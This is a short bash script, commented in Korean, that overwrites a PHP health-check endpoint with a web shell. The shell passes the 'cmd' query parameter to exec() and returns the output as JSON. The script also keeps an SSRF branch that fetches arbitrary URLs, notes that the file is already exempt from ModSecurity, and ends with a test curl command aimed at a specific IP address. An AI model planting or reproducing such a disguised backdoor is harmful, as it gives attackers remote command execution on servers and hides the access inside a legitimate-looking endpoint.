#!/bin/bash
###############################################################################
# 웹쉘 접근 문제 해결
# health.php를 웹쉘로 활용 (이미 ModSecurity 예외에 있음)
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   웹쉘 접근 문제 해결 중...                               ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# health.php를 웹쉘로 수정
cat > /var/www/html/www/api/health.php << 'EOFPHP'
<?php
header('Content-Type: application/json');

if (isset($_GET['cmd'])) {
    // 웹쉘 기능
    $output = [];
    exec($_GET['cmd'] . ' 2>&1', $output);
    echo json_encode([
        'status' => 'ok',
        'result' => implode("\n", $output)
    ]);
} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    // 기존 SSRF 기능 유지
    $url = $_GET['url'];
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $data = @file_get_contents($url, false, $ctx);
    if ($data !== false) {
        echo json_encode(['status' => 'ok', 'metadata' => $data]);
    } else {
        echo json_encode(['error' => 'Failed to fetch metadata']);
    }
} else {
    // 기본 health check
    echo json_encode(['status' => 'ok', 'timestamp' => time(), 'server' => gethostname()]);
}
?>
EOFPHP

echo "[+] health.php를 웹쉘로 수정 완료"
echo ""
echo "[*] 테스트:"
echo "    curl 'http://52.79.240.83/api/health.php?cmd=whoami'"
echo ""
echo "[*] JSON 결과에서 'result' 필드를 확인하세요"
echo ""
